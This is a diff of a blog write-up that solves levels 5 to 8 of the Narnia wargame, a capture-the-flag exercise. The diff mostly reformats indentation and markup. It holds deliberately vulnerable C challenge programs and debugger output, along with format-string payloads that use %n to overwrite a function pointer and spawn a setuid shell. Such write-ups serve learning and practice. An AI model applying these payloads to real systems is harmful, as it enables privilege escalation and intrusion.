@@ -9,33 +9,33 @@ Solving Narnia Part 2
 
 Carrying on from `Part 1 <http://unlogic.co.uk/2015/04/08/solving-narnia-part1/>`_
 
-Level 05 ##
+Level 05
 -----------
 
-.. code:: c 
+.. code:: c
 
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-     
-    int main(int argc, char **argv){
-        int i = 1;
-        char buffer[64];
-
-        snprintf(buffer, sizeof buffer, argv[1]);
-        buffer[sizeof (buffer) - 1] = 0;
-        printf("Change i's value from 1 -> 500. ");
-
-        if(i==500){
-            printf("GOOD\n");
-            system("/bin/sh");
-        }
-
-        printf("No way...let me give you a hint!\n");
-        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
-        printf ("i = %d (%p)\n", i, &i);
-        return 0;
-    }
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	 
+	int main(int argc, char **argv){
+		int i = 1;
+		char buffer[64];
+	
+		snprintf(buffer, sizeof buffer, argv[1]);
+		buffer[sizeof (buffer) - 1] = 0;
+		printf("Change i's value from 1 -> 500. ");
+	
+		if(i==500){
+			printf("GOOD\n");
+			system("/bin/sh");
+		}
+	
+		printf("No way...let me give you a hint!\n");
+		printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
+		printf ("i = %d (%p)\n", i, &i);
+		return 0;
+	}
 
 A fixed sized buffer again. This time however trying to overflow it in order to
 write to :code:`i` won't work. If we look at line 9 and lookup the manpage for :code:`snprintf`
@@ -105,47 +105,47 @@ We're *28* over the target, so let's reduce the padding
 	$ cat /etc/narnia_pass/narnia6
 	[password]
 
-Level 06 ##
+Level 06
 -----------
 
-.. code:: c
+.. code:: c 
 
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-
-    extern char **environ;
-
-    // tired of fixing values...
-    // - morla
-    unsigned long get_sp(void) {
-           __asm__("movl %esp,%eax\n\t"
-                   "and $0xff000000, %eax"
-                   );
-    }
-
-    int main(int argc, char *argv[]){
-        char b1[8], b2[8];
-        int  (*fp)(char *)=(int(*)(char *))&puts, i;
-
-        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
-
-        /* clear environ */
-        for(i=0; environ[i] != NULL; i++)
-            memset(environ[i], '\0', strlen(environ[i]));
-        /* clear argz    */
-        for(i=3; argv[i] != NULL; i++)
-            memset(argv[i], '\0', strlen(argv[i]));
-
-        strcpy(b1,argv[1]);
-        strcpy(b2,argv[2]);
-        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
-        if(((unsigned long)fp & 0xff000000) == get_sp())
-            exit(-1);
-        fp(b1);
-
-        exit(1);
-    }
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	
+	extern char **environ;
+	
+	// tired of fixing values...
+	// - morla
+	unsigned long get_sp(void) {
+	       __asm__("movl %esp,%eax\n\t"
+	               "and $0xff000000, %eax"
+	               );
+	}
+	
+	int main(int argc, char *argv[]){
+		char b1[8], b2[8];
+		int  (*fp)(char *)=(int(*)(char *))&puts, i;
+	
+		if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }
+	
+		/* clear environ */
+		for(i=0; environ[i] != NULL; i++)
+			memset(environ[i], '\0', strlen(environ[i]));
+		/* clear argz    */
+		for(i=3; argv[i] != NULL; i++)
+			memset(argv[i], '\0', strlen(argv[i]));
+	
+		strcpy(b1,argv[1]);
+		strcpy(b2,argv[2]);
+		//if(((unsigned long)fp & 0xff000000) == 0xff000000)
+		if(((unsigned long)fp & 0xff000000) == get_sp())
+			exit(-1);
+		fp(b1);
+	
+		exit(1);
+	}
 
 In this rather complicated looking listing we notice a few things:
 
@@ -244,62 +244,62 @@ So the last step:
 	$ cat /etc/narnia_pass/narnia7
 	[password]
 
-Level 07 ##
------------
+Level 07
+--------
 
-.. code:: c
+.. code:: c 
 
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    #include <stdlib.h>
-    #include <unistd.h>
-
-    int goodfunction();
-    int hackedfunction();
-
-    int vuln(const char *format){
-        char buffer[128];
-        int (*ptrf)();
-
-        memset(buffer, 0, sizeof(buffer));
-        printf("goodfunction() = %p\n", goodfunction);
-        printf("hackedfunction() = %p\n\n", hackedfunction);
-
-        ptrf = goodfunction;
-        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
-
-        printf("I guess you want to come to the hackedfunction...\n");
-        sleep(2);
-        ptrf = goodfunction;
-
-        snprintf(buffer, sizeof buffer, format);
-
-        return ptrf();
-    }
-
-    int main(int argc, char **argv){
-        if (argc <= 1){
-                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
-                exit(-1);
-        }
-        exit(vuln(argv[1]));
-    }
-
-    int goodfunction(){
-        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
-        fflush(stdout);
-            
-        return 0;
-    }
-
-    int hackedfunction(){
-        printf("Way to go!!!!");
-        fflush(stdout);
-        system("/bin/sh");
-
-        return 0;
-    }
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	
+	int goodfunction();
+	int hackedfunction();
+	
+	int vuln(const char *format){
+	    char buffer[128];
+	    int (*ptrf)();
+	
+	    memset(buffer, 0, sizeof(buffer));
+	    printf("goodfunction() = %p\n", goodfunction);
+	    printf("hackedfunction() = %p\n\n", hackedfunction);
+	
+	    ptrf = goodfunction;
+	    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+	
+	    printf("I guess you want to come to the hackedfunction...\n");
+	    sleep(2);
+	    ptrf = goodfunction;
+	
+	    snprintf(buffer, sizeof buffer, format);
+	
+	    return ptrf();
+	}
+	
+	int main(int argc, char **argv){
+	    if (argc <= 1){
+	            fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+	            exit(-1);
+	    }
+	    exit(vuln(argv[1]));
+	}
+	
+	int goodfunction(){
+	    printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+	    fflush(stdout);
+	        
+	    return 0;
+	}
+	
+	int hackedfunction(){
+	    printf("Way to go!!!!");
+	    fflush(stdout);
+	    system("/bin/sh");
+	
+	    return 0;
+	}
 
 The presence of :code:`snprintf` indicates that this will be another format string attack.
 Great, another one of my least favourites. This should help imprint it on my
@@ -351,30 +351,30 @@ brain though, so let's attack this
 So disassmble the :code:`vuln` function and set a break point just 
 before the call of the function pointer. In the process of this challenge
 I learned of a nice way to determine the number of :code:`%x` you need. Using
-:code:`ltrace` it's possible to increment the number of :code:`%x`'s until you
+:code:`ltrace` it's possible to increment the number of :code:`%x` 's until you
 see your string in the output again. I'll paste only the correcy output here
 
-..code:: console
+.. code:: console 
 
-    narnia7@melinda:/narnia$ ltrace ./narnia7 :code:`python -c "print 'aaaabbbb' + '%x'*7"`
-    __libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 <unfinished ...>
-    memset(0xffffd630, '\0', 128)                                = 0xffffd630
-    printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
-    )                   = 27
-    printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706
-
-    )               = 30
-    printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
-    ) = 41
-    puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
-    )                  = 50
-    sleep(2)                                                     = 0
-    snprintf("aaaabbbb8048238ffffd688f7ffda940"..., 128, "aaaabbbb%x%x%x%x%x%x%x", 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
-    puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
-    )                  = 61
-    fflush(0xf7fcaac0)                                           = 0
-    exit(0 <no return ...>
-    +++ exited (status 0) +++
+	narnia7@melinda:/narnia$ ltrace ./narnia7 `python -c "print 'aaaabbbb' + '%x'*7"`
+	__libc_start_main(0x804868f, 2, 0xffffd774, 0x8048740 <unfinished ...>
+	memset(0xffffd630, '\0', 128)                                = 0xffffd630
+	printf("goodfunction() = %p\n", 0x80486e0goodfunction() = 0x80486e0
+	)                   = 27
+	printf("hackedfunction() = %p\n\n", 0x8048706hackedfunction() = 0x8048706
+	
+	)               = 30
+	printf("before : ptrf() = %p (%p)\n", 0x80486e0, 0xffffd62cbefore : ptrf() = 0x80486e0 (0xffffd62c)
+	) = 41
+	puts("I guess you want to come to the "...I guess you want to come to the hackedfunction...
+	)                  = 50
+	sleep(2)                                                     = 0
+	snprintf("aaaabbbb8048238ffffd688f7ffda940"..., 128, "aaaabbbb%x%x%x%x%x%x%x", 0x8048238, 0xffffd688, 0xf7ffda94, 0, 0x80486e0, 0x61616161, 0x62626262) = 55
+	puts("Welcome to the goodfunction, but"...Welcome to the goodfunction, but i said the Hackedfunction..
+	)                  = 61
+	fflush(0xf7fcaac0)                                           = 0
+	exit(0 <no return ...>
+	+++ exited (status 0) +++
 
 You can see the *aaaa* and *bbbb* at line 14. So we have 7 :code:`%x` to get the second value.
 
@@ -404,10 +404,10 @@ Let's take a look at the stack with that input
 	0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
 
 So at :code:`0xffffd60c` is the address of :code:`goodfunction`. We need to overwrite that
-to point to `0x8048706`, our `hackedfunction`. So as before in `level 05 <http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05>`_
+to point to :code:`0x8048706`, our :code:`hackedfunction`. So as before in `level 05 <http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05>`_
 we use :code:`%n` to try and overwrite this value.
 
-.. code:: console
+.. code:: bash
 
 	(gdb) r $(python -c "print 'aaaa\x0c\xd6\xff\xff' + '%x'*6 + '%n'")
 	
@@ -430,11 +430,10 @@ we use :code:`%n` to try and overwrite this value.
 	0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
 	0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
 	0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
-	(gdb)
- 
-The value of *2f* at :code:`0xffffd60c` shows us that our overwrite was successful
-and we wrote the value of *47*. We need to write :code:`0x8048706` which is *134514438* in decimal.
-So let's add our :code:`%d` in and remember to adjust the number of :code:`%x` s too, so we can see
+
+The value of *2f* at :code:`0xffffd60c` shows us that our overwrite was successful 
+and we wrote the value of *47*\ . We need to write :code:`0x8048706` which is :code:`134514438` in decimal.
+So let's add our :code:`%d` in and remember to adjust the number of :code:`%x`\ s too, so we can see
 how much padding we need
 
 .. code:: console
@@ -549,42 +548,42 @@ And now we need to run it from the commandline to actually get a proper setuid s
 
 Notice that the address of :code:`ptrf` is not the same in the shell :)
 
-Level 08 ##
+Level 08
 -----------
 
-.. code: c
+.. code:: c 
 
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    // gcc's variable reordering fucked things up
-    // to keep the level in its old style i am 
-    // making "i" global unti i find a fix 
-    // -morla 
-    int i; 
-
-    void func(char *b){
-        char *blah=b;
-        char bok[20];
-        //int i=0;
-        
-        memset(bok, '\0', sizeof(bok));
-        for(i=0; blah[i] != '\0'; i++)
-            bok[i]=blah[i];
-
-        printf("%s\n",bok);
-    }
-
-    int main(int argc, char **argv){
-            
-        if(argc > 1)       
-            func(argv[1]);
-        else    
-        printf("%s argument\n", argv[0]);
-
-        return 0;
-    }
-
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	// gcc's variable reordering fucked things up
+	// to keep the level in its old style i am 
+	// making "i" global unti i find a fix 
+	// -morla 
+	int i; 
+	
+	void func(char *b){
+	    char *blah=b;
+	    char bok[20];
+	    //int i=0;
+	    
+	    memset(bok, '\0', sizeof(bok));
+	    for(i=0; blah[i] != '\0'; i++)
+	        bok[i]=blah[i];
+	
+	    printf("%s\n",bok);
+	}
+	
+	int main(int argc, char **argv){
+	        
+	    if(argc > 1)       
+	        func(argv[1]);
+	    else    
+	    printf("%s argument\n", argv[0]);
+	
+	    return 0;
+	}
+	
 
 I'm struggling with this, and rather than delay the whole post because of the last
 level, I decided to post anyway. I'll update this when I have this figured out.
